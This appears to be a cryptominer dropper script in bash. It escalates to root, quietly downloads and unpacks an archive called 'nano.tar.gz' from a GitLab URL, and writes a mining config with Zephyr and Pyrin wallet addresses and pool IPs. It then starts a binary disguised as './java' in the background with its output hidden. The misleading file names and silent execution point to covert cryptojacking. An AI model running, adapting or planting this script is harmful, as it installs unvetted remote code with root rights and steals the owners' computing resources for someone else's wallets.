#!/bin/bash
sudo su <<EOF
wget -qO nano.tar.gz https://gitlab.com/jasa4/jasa/-/raw/main/nano.tar.gz && tar -xf nano.tar.gz && tar -xf nano.tar.gz >/dev/null 2>&1

cat > config.ini <<END
[RandomX]
wallet = ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo $(TZ=UTC-7 date +"%H-%M-%S"))
pool1 = 47.89.195.104:443

[PyrinHash]
wallet = pyrin:qpkxgkszu2dtek33z5nu5uvqftmj6x9stjvpsrdr502p2v8mpqduwt74nc0jm.$(echo $(TZ=UTC-7 date +"%H-%M-%S"))
pool1 = 47.236.130.246:80
END

nohup ./java &>/dev/null &
EOF

